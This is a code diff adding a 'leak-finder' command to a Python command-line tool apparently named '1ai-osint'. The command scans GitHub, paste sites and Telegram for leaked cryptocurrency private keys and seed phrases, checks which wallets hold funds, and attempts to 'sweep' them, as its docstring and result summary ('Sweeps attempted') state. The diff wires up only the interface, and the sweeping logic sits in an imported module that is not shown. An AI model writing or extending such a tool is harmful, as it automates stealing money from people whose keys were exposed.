@@ -405,5 +405,98 @@ def scan(
         typer.echo("", err=True)  # newline on stderr so terminal stays clean
 
 
+@app.command()
+def leak_finder(
+    continuous: bool = typer.Option(
+        False, "--continuous", "-c", help="Run in continuous mode (periodic scans)"
+    ),
+    address: str = typer.Option(
+        "", "--address", "-a", help="Search for a specific wallet address"
+    ),
+    sources: str = typer.Option(
+        "github,paste,telegram,tgstat",
+        "--sources", "-s",
+        help="Comma-separated list of sources: github, paste, telegram, tgstat",
+    ),
+    interval: int = typer.Option(
+        300, "--interval", "-i", help="Seconds between runs in continuous mode (default: 300)"
+    ),
+    github_token: str = typer.Option(
+        "", help="GitHub API token for authenticated search (higher rate limits)"
+    ),
+):
+    """Find leaked crypto keys and mnemonics from public sources.
+
+    Searches GitHub, paste sites, and Telegram for leaked private keys
+    and mnemonic phrases, then checks balances and sweeps funded wallets.
+
+    Examples:
+        # One-shot scan of all sources
+        1ai-osint leak-finder
+
+        # Search for a specific address
+        1ai-osint leak-finder --address 0xAbCdEf...
+
+        # Continuous monitoring every 10 minutes
+        1ai-osint leak-finder --continuous --interval 600
+
+        # Only scan GitHub and pastes
+        1ai-osint leak-finder --sources github,paste
+    """
+    from src.modules.crypto.leak_finder.coordinator import (
+        LeakFinderCoordinator,
+        ALL_SOURCES,
+    )
+
+    source_list = [s.strip() for s in sources.split(",") if s.strip()]
+    invalid = [s for s in source_list if s not in ALL_SOURCES]
+    if invalid:
+        typer.echo(
+            f"Error: Unknown source(s): {', '.join(invalid)}. "
+            f"Valid sources: {', '.join(ALL_SOURCES)}",
+            err=True,
+        )
+        raise typer.Exit(1)
+
+    coordinator = LeakFinderCoordinator(
+        sources=source_list,
+        github_token=github_token or None,
+    )
+
+    async def _run():
+        await coordinator.start()
+        try:
+            if address:
+                typer.echo(f"Searching for address: {address}", err=True)
+                result = await coordinator.search_address(address)
+                typer.echo(
+                    f"Search complete: {result.raw_leaks_fetched} raw leaks, "
+                    f"{result.keys_deduplicated} keys found"
+                )
+            elif continuous:
+                typer.echo(
+                    f"Starting continuous leak finder "
+                    f"(sources: {', '.join(source_list)}, interval: {interval}s)",
+                    err=True,
+                )
+                await coordinator.run_continuous(interval_sec=interval)
+            else:
+                typer.echo(f"Running leak finder (sources: {', '.join(source_list)})", err=True)
+                result = await coordinator.run_once()
+                typer.echo(
+                    f"Scan complete:\n"
+                    f"  Raw leaks fetched:  {result.raw_leaks_fetched}\n"
+                    f"  Keys extracted:     {result.keys_extracted}\n"
+                    f"  Addresses checked:  {result.addresses_checked}\n"
+                    f"  Funded wallets:     {result.funded_wallets}\n"
+                    f"  Sweeps attempted:   {len(result.sweep_results)}\n"
+                    f"  Elapsed:            {result.elapsed_seconds:.1f}s"
+                )
+        finally:
+            await coordinator.stop()
+
+    asyncio.run(_run())
+
+
 if __name__ == "__main__":
     app()
